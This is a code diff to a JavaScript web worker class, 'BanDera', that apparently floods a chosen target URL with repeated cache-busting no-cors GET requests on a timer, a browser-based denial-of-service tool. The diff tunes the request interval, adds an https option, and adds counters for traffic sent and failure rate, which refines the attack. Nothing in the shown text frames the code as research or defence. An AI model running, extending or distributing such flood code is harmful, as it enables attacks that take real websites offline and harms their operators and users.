@@ -10,23 +10,24 @@ class BanDera {
         timer: {
             job: null,
             ui: null
-        }
+        },
+        traffic: 0,
     }
 
     target = null;
-    interval = 50;
+    interval = 200;
 
-    constructor(target, interval = 50) {
+    constructor(target, interval = 200) {
         this.target = target;
         this.interval = interval;
     }
 
-    set interval(value) {
-        if (value < 10) return;
-        console.log('setter works');
-        this.interval = value;
-        this.restart();
-    }
+    // set interval(value) {
+    //     if (value < 10) return;
+    //     console.log('setter works');
+    //     this.interval = value;
+    //     this.restart();
+    // }
 
     start() {
         if (!this.isRunning()) {
@@ -37,15 +38,18 @@ class BanDera {
 
             // Start UI refreshing
             this.state.timer.ui = setInterval(() => {
-                postMessage(this.state.requests);
-            }, 5000);
+                let rate = (this.state.requests.failed / this.state.requests.total) * 100 || 0;
+                postMessage({ ...this.state.requests, traffic: this.state.traffic, rate });
+            }, 1000);
         }
     }
 
     stop() {
         if (this.isRunning()) {
             clearInterval(this.state.timer.job);
+            this.state.timer.job = null;
             clearInterval(this.state.timer.ui);
+            this.state.timer.ui = null;
         }
     }
 
@@ -59,7 +63,9 @@ class BanDera {
     }
 
     makeRequest() {
-        fetch(this.target.url + this.getRandomParam(), {
+        const requestUrl = `http${this.target.secure ? 's': ''}://${this.target.url + this.getRandomParam()}`;
+        this.state.traffic += new TextEncoder().encode(requestUrl).length;
+        fetch(requestUrl, {
             method: 'GET',
             mode: 'no-cors',
             cache: 'no-cache',
@@ -114,7 +120,7 @@ class BanDera {
 
 let config = {
     target: null,
-    interval: null,
+    interval: 200,
     action: null
 }
 
@@ -125,7 +131,7 @@ onmessage = function (event) {
 
     if (!bandera && !config.target) return;
 
-    bandera = new BanDera(config.target, config.interval);
+    bandera ??= new BanDera(config.target, config.interval);
 
     if (config.target) {
         bandera.target = config.target;
